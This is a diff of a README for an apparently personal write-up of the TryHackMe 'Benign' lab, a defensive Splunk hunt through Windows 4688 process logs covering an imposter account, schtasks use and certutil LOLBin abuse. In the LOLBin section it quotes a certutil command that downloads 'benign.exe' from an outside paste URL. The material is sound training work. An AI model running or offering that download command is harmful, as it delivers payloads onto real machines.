@@ -1,230 +1,314 @@
-TryHackMe Benign -- SOC Investigation
+# 🔎 TryHackMe Benign — SOC Investigation
 
-Overview
+## Overview
 
-This project documents my investigation of the TryHackMe Benign
-challenge using Splunk and Windows event logs. The lab focused on
-identifying suspicious process activity, anomalous user behavior,
-scheduled-task activity, LOLBin abuse, payload delivery, and follow-on
-activity.
+This project documents my investigation of the **TryHackMe Benign** challenge using **Splunk** and **Windows Event Logs**. The investigation focused on analyzing Windows process creation events to identify anomalous user behavior, scheduled-task activity, LOLBin abuse, payload delivery, and command-and-control activity.
 
-Tools: Splunk, Windows Event Logs
-Primary Event: Windows Security Event ID 4688 -- Process Creation
-Skills: SPL, Windows Event Analysis, Threat Hunting, Command-Line
-Analysis, LOLBin Analysis, Timeline Reconstruction
+|                      |                                                                             |
+| -------------------- | --------------------------------------------------------------------------- |
+| **Platform**         | TryHackMe                                                                   |
+| **SIEM**             | Splunk                                                                      |
+| **Data Source**      | Windows Security Event Logs                                                 |
+| **Primary Event ID** | 4688 — Process Creation                                                     |
+| **Focus Areas**      | Threat Hunting, Process Analysis, LOLBin Detection, Timeline Reconstruction |
 
-Note: This write-up focuses on the investigation methodology and
-evidence rather than simply listing challenge answers.
+> **Portfolio Note:** This write-up focuses on my investigation methodology, queries, observations, and lessons learned rather than simply providing challenge answers.
 
-Investigation Goals
+---
 
-Identify suspicious or anomalous user activity.
+## 🎯 Investigation Goals
 
-Analyze Windows process-creation events.
+The objectives of this investigation were to:
 
-Investigate scheduled-task execution.
+* Identify suspicious or anomalous user activity.
+* Analyze Windows process-creation events.
+* Investigate scheduled-task activity.
+* Identify abuse of legitimate Windows utilities.
+* Trace suspicious payload delivery.
+* Investigate potential command-and-control activity.
+* Build an incident timeline from the available telemetry.
 
-Identify abuse of legitimate Windows utilities.
+---
 
-Trace payload delivery.
+# 1. Validating the Log Schema
 
-Pivot from known suspicious activity to build an incident timeline.
+I began by examining Windows process-creation events in Splunk.
 
-1. Validating the Log Schema
+An important early lesson was that I should **inspect the raw event structure before assuming field names**. My initial query did not return the expected results because the dataset used `EventID` rather than the field name I initially expected.
 
-One of the first lessons from this investigation was to inspect the raw
-events before assuming field names. An initial search did not return the
-expected results because the dataset used EventID rather than the
-field name I initially expected.
+Examining a raw event revealed several fields that would become important throughout the investigation:
 
-Inspecting a raw event showed the useful fields included EventID,
-UserName, HostName, ProcessName, and CommandLine.
+* `EventID`
+* `UserName`
+* `HostName`
+* `ProcessName`
+* `CommandLine`
 
+![Windows Event ID 4688](images/event-4688.png)
 
+*Figure 1 — Raw Windows Event ID 4688 showing process-creation telemetry.*
 
-Figure 1 -- Raw Event ID 4688 showing the fields available for process
-analysis.
+### SPL Query
 
+```spl
 index=win_eventlogs EventID=4688
 | stats count by UserName
 | sort UserName
+```
 
-Takeaway
+### What I Learned
 
-Before writing complex SPL, verify how the data is actually parsed.
-Field names can differ between datasets and logging pipelines.
+Before constructing complex searches, I should verify how the data is actually structured and parsed. Field names can differ between environments, SIEM configurations, and datasets.
 
-2. Identifying Anomalous User Activity
+---
 
-I used process-creation events to enumerate usernames and compare
-observed accounts with the users expected in the environment. This
-allowed me to identify an account that did not fit the expected user
-baseline.
+# 2. Identifying Anomalous User Activity
 
+After understanding the available fields, I used process-creation events to enumerate usernames and compare observed accounts against the users expected within the environment.
 
+This allowed unusual account activity to stand out from the baseline.
 
-Figure 2 -- Identification of anomalous account activity during the
-investigation.
+![Imposter Account](images/imposter-account.png)
 
-An important distinction during this step was:
+*Figure 2 — Identifying anomalous account activity within the environment.*
 
-UserName = account executing the process
+During this step, I also learned the importance of distinguishing between two fields:
 
-HostName = endpoint where the process executed
+| Field      | Meaning                                 |
+| ---------- | --------------------------------------- |
+| `UserName` | The account executing the process       |
+| `HostName` | The endpoint where the process executed |
 
-This matters because an account can execute activity on a workstation
-belonging to another department.
+A user appearing on a workstation does **not** necessarily mean that workstation belongs to that user or department.
 
-3. Investigating Scheduled Tasks
+This distinction becomes particularly important when investigating potential lateral movement or compromised credentials.
 
-I searched for executions of schtasks.exe, the built-in Windows
-command-line utility for managing scheduled tasks.
+---
 
+# 3. Investigating Scheduled Task Activity
+
+I next investigated executions of:
+
+```text
+schtasks.exe
+```
+
+`schtasks.exe` is a legitimate Windows utility used to create, modify, query, and execute scheduled tasks.
+
+### SPL Query
+
+```spl
 index=win_eventlogs EventID=4688 ProcessName="*schtasks.exe"
 | table _time HostName UserName ProcessName CommandLine
 | sort _time
+```
 
+![Scheduled Task Investigation](images/scheduled-task.png)
 
+*Figure 3 — Process-creation events involving schtasks.exe.*
 
-Figure 3 -- Process-creation activity involving schtasks.exe.
+Scheduled tasks are common in legitimate Windows administration, but they can also be abused by attackers for **persistence** or automated execution.
 
-Scheduled tasks can be legitimate administrative activity, but attackers
-also commonly abuse them for persistence and automated execution.
-Context such as the user, host, command line, and surrounding events is
-therefore critical.
+Because of this, simply seeing `schtasks.exe` is not enough to determine malicious activity. The surrounding context matters:
 
-4. Identifying LOLBin Abuse
+* Who executed it?
+* What host executed it?
+* What command-line arguments were supplied?
+* What happened immediately before and after execution?
 
-The strongest suspicious activity involved certutil.exe. Certutil
-is a legitimate Windows binary used for certificate-related operations.
-However, its network functionality can also be abused to retrieve files,
-making it a common example of a Living Off the Land Binary (LOLBin).
+---
 
-The process-creation event showed:
+# 4. Detecting LOLBin Abuse
 
+One of the strongest suspicious events identified during the investigation involved:
+
+```text
+certutil.exe
+```
+
+`certutil.exe` is a legitimate Microsoft Windows utility primarily associated with certificate management.
+
+However, legitimate system binaries can sometimes be abused by attackers to perform actions outside their normal administrative purpose. This technique is commonly referred to as **Living Off the Land**.
+
+In this case, the command line showed `certutil.exe` being used to retrieve a file from an external location.
+
+### Observed Command
+
+```text
 certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
+```
 
+![Certutil Download](images/certutil-download.png)
 
+*Figure 4 — Windows Event ID 4688 showing certutil.exe being used to retrieve benign.exe.*
 
-Figure 4 -- Event ID 4688 showing certutil.exe being used to
-retrieve benign.exe.
+### Why This Was Suspicious
 
-The event provided several useful investigation pivots at once:
-executing user, endpoint, process name, full command line, external
-destination, downloaded filename, and timestamp.
+A single process-creation event provided multiple investigation pivots:
 
-5. Payload Identification
+| Indicator     | Investigative Value                              |
+| ------------- | ------------------------------------------------ |
+| `UserName`    | Identifies who executed the command              |
+| `HostName`    | Identifies the affected endpoint                 |
+| `ProcessName` | Identifies the executable                        |
+| `CommandLine` | Reveals what the executable was instructed to do |
+| URL           | Provides an external infrastructure indicator    |
+| Filename      | Provides an additional endpoint indicator        |
+| Timestamp     | Allows surrounding activity to be investigated   |
 
-The downloaded payload was identified as benign.exe.
+This demonstrated why **command-line logging is extremely valuable** during endpoint investigations.
 
+---
 
+# 5. Payload Identification
 
-Figure 5 -- Payload identification during the TryHackMe
-investigation.
+Analysis of the process command line identified the downloaded payload as:
 
-Once the filename was known, it could be used as another indicator to
-search across the dataset:
+```text
+benign.exe
+```
 
+![Payload Identification](images/payload-answer.png)
+
+*Figure 5 — Identification of the downloaded payload during the investigation.*
+
+Once the filename was known, I could pivot on it across the entire dataset.
+
+### SPL Query
+
+```spl
 index=win_eventlogs "benign.exe"
 | table _time HostName UserName ProcessName CommandLine
 | sort _time
+```
 
-This is a useful threat-hunting technique: once one reliable indicator
-is discovered, pivot on it to find related activity.
+This demonstrated an important threat-hunting workflow:
 
-6. Building the Incident Timeline
+> **Find an indicator → Pivot on the indicator → Identify related activity → Expand the timeline**
 
-After identifying a high-confidence suspicious event, I narrowed the
-investigation to the affected host, user, and time period.
+Instead of repeatedly searching the entire dataset, each confirmed indicator can lead to additional evidence.
 
+---
+
+# 6. Timeline Reconstruction
+
+After identifying a high-confidence suspicious event, I narrowed the investigation around the associated:
+
+* User
+* Host
+* Timestamp
+* Process
+* Filename
+
+### SPL Query
+
+```spl
 index=win_eventlogs HostName="HR_01" UserName="haroon"
 earliest="03/04/2022:10:38:00" latest="03/04/2022:11:30:00"
 | table _time EventID ProcessName CommandLine
 | sort _time
+```
 
-Instead of treating each log as an isolated event, this allowed me to
-think about the activity as a sequence:
+This allowed me to stop thinking about individual logs and instead reconstruct the activity chronologically.
 
-Suspicious execution → Payload download → Payload execution →
-Follow-on activity → C2 activity
+### Investigation Flow
 
-Splunk Techniques Practiced
+```text
+Suspicious Process Execution
+          ↓
+     Payload Download
+          ↓
+     Payload Execution
+          ↓
+    Follow-On Activity
+          ↓
+   C2 Communication
+```
 
-Technique                           Purpose
+Timeline reconstruction made it easier to understand **how individual events were connected** rather than treating each log entry independently.
 
-stats count by UserName           Establish a user baseline and
-identify anomalies
+---
 
-table                             Reduce noise and display
-investigation-relevant fields
+# 🔍 Splunk Techniques Practiced
 
-sort _time                        Reconstruct activity
-chronologically
+| SPL Technique             | Purpose                                        |
+| ------------------------- | ---------------------------------------------- |
+| `stats count by UserName` | Establish user activity and identify anomalies |
+| `table`                   | Display only investigation-relevant fields     |
+| `sort _time`              | Reconstruct activity chronologically           |
+| `EventID=4688`            | Focus on Windows process creation              |
+| `ProcessName=`            | Hunt for specific executables                  |
+| Filename searches         | Pivot using discovered indicators              |
+| `HostName=`               | Focus investigation on an affected endpoint    |
+| `UserName=`               | Follow activity associated with an account     |
+| `earliest` / `latest`     | Restrict searches to an investigation window   |
 
-EventID=4688                      Focus on Windows process-creation
-events
+---
 
-Filename searches                   Pivot from discovered indicators
+# 🧠 Potential MITRE ATT&CK Mapping
 
-Process-name searches               Hunt for suspicious or dual-use
-binaries
+Based on the behaviors observed during the investigation, some activity could potentially correspond with the following ATT&CK techniques:
 
-Potential MITRE ATT&CK Mapping
+| Observed Behavior                          | Potential MITRE ATT&CK Technique                   |
+| ------------------------------------------ | -------------------------------------------------- |
+| Payload transfer using a Windows utility   | **T1105 — Ingress Tool Transfer**                  |
+| Scheduled-task activity                    | **T1053.005 — Scheduled Task/Job: Scheduled Task** |
+| Command execution                          | **T1059 — Command and Scripting Interpreter**      |
+| External command-and-control communication | **T1071 — Application Layer Protocol**             |
 
-Observed Behavior                   Potential Technique
+> These mappings are provided as investigative context. Exact ATT&CK classification depends on the evidence available and how the technique was implemented.
 
-Downloading a payload with a        T1105 -- Ingress Tool Transfer
-legitimate Windows utility
+---
 
-Scheduled-task activity             T1053.005 -- Scheduled Task/Job:
-Scheduled Task
+# 🛠️ Skills Demonstrated
 
-Command-line execution              T1059 -- Command and Scripting
-Interpreter
+Through this investigation, I practiced:
 
-These mappings are presented as investigative context; exact ATT&CK
-classification depends on the supporting evidence available.
+* Splunk SPL
+* SIEM log analysis
+* Windows Event Log analysis
+* Windows Event ID 4688 analysis
+* Process and command-line analysis
+* Threat hunting
+* LOLBin identification
+* Indicator pivoting
+* Suspicious account investigation
+* Timeline reconstruction
+* Basic MITRE ATT&CK mapping
+* Incident investigation methodology
 
-Key Takeaways
+---
 
-Inspect raw events before assuming field names.
+# 📚 Key Takeaways
 
-Windows Event ID 4688 is highly valuable for process
-investigations.
+1. **Inspect raw events first.** Understanding the available fields prevents wasted time troubleshooting incorrect searches.
 
-Command-line arguments often provide more context than the
-executable name alone.
+2. **Event ID 4688 provides valuable endpoint visibility.** Process name, user, host, timestamp, and command-line data can reveal significant activity.
 
-A legitimate Windows executable does not automatically indicate
-legitimate behavior.
+3. **Command-line arguments provide critical context.** The executable alone may appear legitimate while its arguments reveal suspicious behavior.
 
-Understand the difference between the executing user and the
-affected host.
+4. **Legitimate tools can be abused.** The presence of a trusted Windows binary does not automatically mean the activity is benign.
 
-Establishing a baseline makes anomalous accounts and processes
-easier to identify.
+5. **User and host context are different.** `UserName` identifies who executed something, while `HostName` identifies where it occurred.
 
-Once a strong indicator is found, pivot using usernames, hosts,
-processes, filenames, URLs, and timestamps.
+6. **Indicators create investigation pivots.** Users, hosts, filenames, processes, URLs, and timestamps can all lead to related evidence.
 
-Reconstructing a timeline is more valuable than examining individual
-logs in isolation.
+7. **Build a timeline.** Understanding the sequence of events is more valuable than examining logs individually.
 
-Analyst Reflection
+---
 
-This lab strengthened my ability to investigate Windows endpoint
-activity using Splunk. I practiced analyzing Event ID 4688, validating
-log fields, identifying anomalous user activity, investigating scheduled
-tasks, recognizing LOLBin abuse, analyzing command-line arguments, and
-pivoting from a suspicious event to related activity.
+# 📝 Analyst Reflection
 
-The biggest lesson was to approach the investigation as a chain of
-evidence rather than a series of challenge questions. Once a
-high-confidence suspicious event was identified, the user, host,
-process, filename, URL, and timestamp became pivots for reconstructing
-the rest of the activity.
+This lab strengthened my ability to investigate Windows endpoint activity using Splunk.
 
-Disclaimer
+I practiced analyzing **Windows Event ID 4688**, validating SIEM field names, identifying anomalous account activity, investigating scheduled tasks, recognizing LOLBin abuse, analyzing command-line arguments, and pivoting from suspicious events to related activity.
 
-This investigation was completed in the authorized TryHackMe Benign
-training environment for educational purposes.
+My biggest takeaway was learning to approach the investigation as a **chain of evidence rather than a series of challenge questions**.
+
+Once I identified a high-confidence suspicious event, the associated user, host, process, filename, URL, and timestamp became pivots that could be used to reconstruct the broader activity.
+
+---
+
+## ⚠️ Disclaimer
+
+This investigation was performed in the authorized **TryHackMe Benign** training environment for educational and professional development purposes.
